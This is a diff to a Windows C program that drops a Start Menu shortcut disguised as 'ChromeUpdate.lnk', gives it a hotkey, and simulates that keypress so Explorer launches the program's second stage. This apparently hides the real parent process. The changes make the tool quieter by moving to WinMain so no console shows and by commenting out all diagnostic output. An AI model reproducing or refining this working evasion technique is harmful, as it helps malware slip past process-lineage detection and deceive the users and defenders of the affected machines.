@@ -4,7 +4,6 @@
 #include <stdio.h>
 
 #define STAGE_TWO_STRING "stage2"
-
 #define LINK_FILE_NAME L"ChromeUpdate.lnk"
 #define LINK_KEY 'B'
 
@@ -39,12 +38,9 @@ char* GetCurrentProcessPath() {
 void Stage1();
 void Stage2();
 
-int main(int argc, char *argv[]) {
-
-    // Alternative approach to manage stages: Atoms, File, NamedPipe, ...
-    // A simple string as an argument was chosen since it`s the most basic one
-
-    if (argc > 1 && strcmp(argv[1], STAGE_TWO_STRING) == 0){
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Parse command-line arguments to check if Stage 2 should be executed
+    if (__argc > 1 && strcmp(__argv[1], STAGE_TWO_STRING) == 0) {
         Stage2();
     } else {
         Stage1();
@@ -67,7 +63,7 @@ void Stage1() {
 
     if (result == 0) {
         // Error handling
-        printf("Failed to expand environment string. Error: %lu\n", GetLastError());
+        //printf("Failed to expand environment string. Error: %lu\n", GetLastError());
         goto cleanup;
     }
 
@@ -76,75 +72,75 @@ void Stage1() {
 
     HRESULT hr = StringCchCatW(finalPath, MAX_PATH, L"\\Microsoft\\Windows\\Start Menu\\");
     if (FAILED(hr)) {
-        printf("Failed to concatenate Start Menu path. Error: 0x%08lx\n", hr);
+        //printf("Failed to concatenate Start Menu path. Error: 0x%08lx\n", hr);
         return;
     }
 
     // Concatenate the target lnk file path to the expanded path
     hr = StringCchCatW(finalPath, MAX_PATH, LINK_FILE_NAME);
     if (FAILED(hr)) {
-        printf("Failed to concatenate strings. Error: 0x%08lx\n", hr);
+        //printf("Failed to concatenate strings. Error: 0x%08lx\n", hr);
         goto cleanup;
     }
 
     // Initialize COM library
     hres = CoInitialize(NULL);
     if (FAILED(hres)) {
-        printf("Failed to initialize COM library. Error: %lx\n", hres);
+        //printf("Failed to initialize COM library. Error: %lx\n", hres);
         goto cleanup;
     }
 
     // Create an instance of the IShellLink interface
     hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (void**)&psl);
     if (FAILED(hres)) {
-        printf("Failed to create IShellLink instance. Error: %lx\n", hres);
+        //printf("Failed to create IShellLink instance. Error: %lx\n", hres);
         goto cleanup;
     }
 
     // Set the correct path to the target file
     hres = psl->lpVtbl->SetPath(psl, targetPath);
     if (FAILED(hres)) {
-        printf("Failed to set path. Error: %lx\n", hres);
+        //printf("Failed to set path. Error: %lx\n", hres);
         goto cleanup;
     }
 
     // Set arguments to exec second stage (optional if you implemented other staging control method)
     hres = psl->lpVtbl->SetArguments(psl, STAGE_TWO_STRING);
     if (FAILED(hres)) {
-        printf("Failed to set arguments. Error: %lx\n", hres);
+        //printf("Failed to set arguments. Error: %lx\n", hres);
         goto cleanup;
     }
 
     // Set the hotkey (Ctrl + Shift + What-Ever-Key-You-Chose)
     hres = psl->lpVtbl->SetHotkey(psl, MAKEWORD(LINK_KEY, HOTKEYF_CONTROL | HOTKEYF_SHIFT));
     if (FAILED(hres)) {
-        printf("Failed to set hotkey. Error: %lx\n", hres);
+        //printf("Failed to set hotkey. Error: %lx\n", hres);
         goto cleanup;
     }
 
     // Get the IPersistFile interface to save the shortcut
     hres = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (void**)&ppf);
     if (FAILED(hres)) {
-        printf("Failed to get IPersistFile interface. Error: %lx\n", hres);
+        //printf("Failed to get IPersistFile interface. Error: %lx\n", hres);
         goto cleanup;
     }
 
     // Save the shortcut
     hres = ppf->lpVtbl->Save(ppf, finalPath, TRUE);
     if (FAILED(hres)) {
-        printf("Failed to save shortcut. Error: %lx\n", hres);
+        //printf("Failed to save shortcut. Error: %lx\n", hres);
         goto cleanup;
     }
-    printf("Shortcut created successfully.\n");
+    //printf("Shortcut created successfully.\n");
 
     HWND hPrevWnd = GetForegroundWindow();
     HWND hExplorerWnd = FindWindow("Shell_TrayWnd", NULL); // "Shell_TrayWnd" is the class name for the task bar
     if (hExplorerWnd == NULL) {
-        printf("Target window not found.\n");
+        //printf("Target window not found.\n");
         return;
     }
     SetForegroundWindow(hExplorerWnd);
-    printf("Calling Shortcut.\n");
+    //printf("Calling Shortcut.\n");
 
     // Simulate the shortcut using SendInput
     INPUT inputs[6] = { 0 };
@@ -188,8 +184,8 @@ void Stage1() {
 
     cleanup:
     if(targetPath!=NULL) free(targetPath);
-    ppf->lpVtbl->Release(ppf);
-    psl->lpVtbl->Release(psl);
+    if(ppf) ppf->lpVtbl->Release(ppf);
+    if(psl) psl->lpVtbl->Release(psl);
     CoUninitialize();
 }
 
